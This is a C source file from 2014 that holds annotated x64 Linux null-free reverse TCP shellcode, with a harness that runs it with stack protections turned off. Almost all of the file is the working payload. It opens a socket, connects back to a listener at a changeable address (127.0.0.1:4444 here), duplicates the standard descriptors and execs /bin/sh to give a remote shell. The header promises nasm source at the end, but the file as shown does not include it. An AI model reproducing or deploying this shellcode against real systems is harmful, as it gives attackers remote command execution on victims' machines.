/*
* Author:           Sean Dillon
* Copyright:        (c) 2014 CAaNES, LLC. (http://caanes.com)
* Release Date:     December 19, 2014
*
* Description:      x64 Linux null-free reverse TCP shellcode, optional 4 byte password
* Assembled Size:   77 - 85 bytes, 90 - 98 with password
* Tested On:        Kali 1.0.9a GNU/Linux 3.14.5-kali1-amd64 x86_64
* License:          http://opensource.org/license/MIT
*
* Build/Run:        gcc -m64 -z execstack -fno-stack-protector reverseshell.c -o reverseshell.out
*                   nc -l -p 4444
*/

/*
* NOTE: This C code connects to 127.0.0.1:4444 and does not have the password option enabled.
* Because the IP 127.0.0.1 contains null-bytes, a mask has to be used, adding 8 bytes.
* The end of this file contains the .nasm source code and instructions for building from that.
*/

#include <stdio.h>
#include <string.h>

char shellcode[] =
	"\x31\xf6"                      /* xor    %esi,%esi */
	"\xf7\xe6"                      /* mul    %esi */
	"\xff\xc6"                      /* inc    %esi */
	"\x6a\x02"                      /* pushq  $0x2 */
	"\x5f"                          /* pop    %rdi */
	"\x04\x29"                      /* add    $0x29,%al */
	"\x0f\x05"                      /* syscall */
	"\x50"                          /* push   %rax */
	"\x5f"                          /* pop    %rdi */
	"\x52"                          /* push   %rdx */
	"\x52"                          /* push   %rdx */
	"\xc7\x44\x24\x04\x7d\xff\xfe"  /* movl   $0xfefeff7d,0x4(%rsp) */
	"\xfe"                          /* . */
	"\x81\x44\x24\x04\x02\x01\x01"  /* addl   $0x2010102,0x4(%rsp) */
	"\x02"                          /* . */
	"\x66\xc7\x44\x24\x02\x11\x5c"  /* movw   $0x5c11,0x2(%rsp) */
	"\xc6\x04\x24\x02"              /* movb   $0x2,(%rsp) */
	"\x54"                          /* push   %rsp */
	"\x5e"                          /* pop    %rsi */
	"\x6a\x10"                      /* pushq  $0x10 */
	"\x5a"                          /* pop    %rdx */
	"\x6a\x2a"                      /* pushq  $0x2a */
	"\x58"                          /* pop    %rax */
	"\x0f\x05"                      /* syscall */
	"\x6a\x03"                      /* pushq  $0x3 */
	"\x5e"                          /* pop    %rsi */
	"\xff\xce"                      /* dec    %esi */
	"\xb0\x21"                      /* mov    $0x21,%al */
	"\x0f\x05"                      /* syscall */
	"\x75\xf8"                      /* jne    39 <dupe_loop> */
	"\x56"                          /* push   %rsi */
	"\x5a"                          /* pop    %rdx */
	"\x56"                          /* push   %rsi */
	"\x48\xbf\x2f\x2f\x62\x69\x6e"  /* movabs $0x68732f6e69622f2f,%rdi */
	"\x2f\x73\x68"                  /* . */
	"\x57"                          /* push   %rdi */
	"\x54"                          /* push   %rsp */
	"\x5f"                          /* pop    %rdi */
	"\xb0\x3b"                      /* mov    $0x3b,%al */
	"\x0f\x05"                      /* syscall */;


main(void)
{
	printf("Shellcode length: %d\n", (int)strlen(shellcode));

	/* pollute registers and call shellcode */
	__asm__ (	 "mov $0xffffffffffffffff, %rax\n\t"
		         "mov %rax, %rbx\n\t"
		         "mov %rax, %rcx\n\t"
		         "mov %rax, %rdx\n\t"
		         "mov %rax, %rsi\n\t"
		         "mov %rax, %rdi\n\t"
		         "mov %rax, %rbp\n\t"

		         "call shellcode"	);
}

